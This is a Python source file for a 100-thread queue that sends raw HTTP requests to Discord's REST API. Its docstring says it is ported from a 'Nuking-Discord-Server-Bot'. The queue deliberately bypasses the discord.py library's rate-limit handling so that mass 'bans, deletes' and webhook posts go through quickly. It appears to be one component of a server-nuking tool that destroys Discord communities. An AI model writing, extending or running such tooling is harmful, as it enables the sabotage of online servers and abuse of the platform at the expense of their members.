"""
http_queue.py — LAST STAND | 100-thread raw HTTP request queue.
Directly ported from c-realV2.py by TKperson (Nuking-Discord-Server-Bot).

Architecture:
  100 daemon threads pull (method, url, payload, use_auth) from an unbounded Queue.
  Each thread fires the request directly to Discord's REST API via `requests`,
  completely bypassing discord.py's internal rate-limit bucket system.

  429 handling: sleep retry_after capped at MAX_RETRY_SLEEP seconds, then requeue.
  Requests are NEVER silently dropped — if retry_after > cap, we still sleep the cap
  and requeue so critical operations (bans, deletes) always eventually complete.
  Stop: call clear() to drain pending items instantly.

  All q.put() calls are non-blocking (unbounded queue).
  await q.join() offloads q.join() to a thread so the asyncio event loop
  (and Discord heartbeat) never stall.
"""

import json
import os
import time
from queue import Queue, Empty
from threading import Thread

import requests

API_BASE        = "https://discord.com/api/v10"
CONCURRENT      = 100
MAX_RETRY_SLEEP = 30.0


class HttpQueue:
    _instance: "HttpQueue | None" = None

    def __init__(self, token: str, concurrent: int = CONCURRENT) -> None:
        self._auth_headers = {
            "authorization": f"Bot {token}",
            "content-type": "application/json",
        }
        self._wh_headers = {
            "content-type": "application/json",
        }
        self._q: Queue = Queue()
        for _ in range(concurrent):
            Thread(target=self._worker, daemon=True).start()

    def _worker(self) -> None:
        while True:
            method, url, payload, use_auth = self._q.get()
            try:
                headers = self._auth_headers if use_auth else self._wh_headers
                kwargs: dict = {"headers": headers, "timeout": 6}
                if payload is not None:
                    kwargs["data"] = json.dumps(payload)
                r = method(url, **kwargs)
                if r.status_code == 429:
                    try:
                        data = r.json()
                        retry_after = float(data.get("retry_after", 1))
                    except Exception:
                        retry_after = 1.0
                    sleep_for = min(retry_after, MAX_RETRY_SLEEP)
                    time.sleep(sleep_for)
                    self._q.put((method, url, payload, use_auth))
                    self._q.task_done()
                    continue
            except Exception:
                pass
            self._q.task_done()

    def put(self, method, url: str, payload=None) -> None:
        """Queue an authenticated Discord API request."""
        self._q.put((method, url, payload, True))

    def put_webhook(self, url: str, payload: dict) -> None:
        """Queue a webhook POST (no Authorization header needed)."""
        self._q.put((requests.post, url, payload, False))

    def clear(self) -> None:
        """Drain all pending items immediately — call on /stop."""
        try:
            while True:
                self._q.get_nowait()
                self._q.task_done()
        except Empty:
            pass
        except Exception:
            pass

    async def join(self) -> None:
        """Wait for all queued requests to complete without blocking the event loop."""
        import asyncio
        loop = asyncio.get_event_loop()
        await loop.run_in_executor(None, self._q.join)

    @classmethod
    def get(cls) -> "HttpQueue":
        """Return the singleton instance, creating it on first call."""
        if cls._instance is None:
            token = os.getenv("DISCORD_BOT_TOKEN", "")
            cls._instance = cls(token)
        return cls._instance
